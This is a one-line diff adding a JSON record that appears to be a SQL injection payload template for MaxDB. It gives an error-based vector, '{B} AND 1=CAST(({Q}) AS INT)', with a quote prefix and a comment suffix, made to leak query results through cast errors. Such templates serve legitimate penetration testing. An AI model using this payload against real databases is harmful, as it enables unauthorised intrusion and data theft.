@@ -1,0 +1,1 @@
+{"dbms": "maxdb", "technique": "error", "boundary": {"prefix": "'", "suffix": "-- -", "type": "single"}, "vector": "{B} AND 1=CAST(({Q}) AS INT)", "comment": "maxdb error: single, inline comment"}
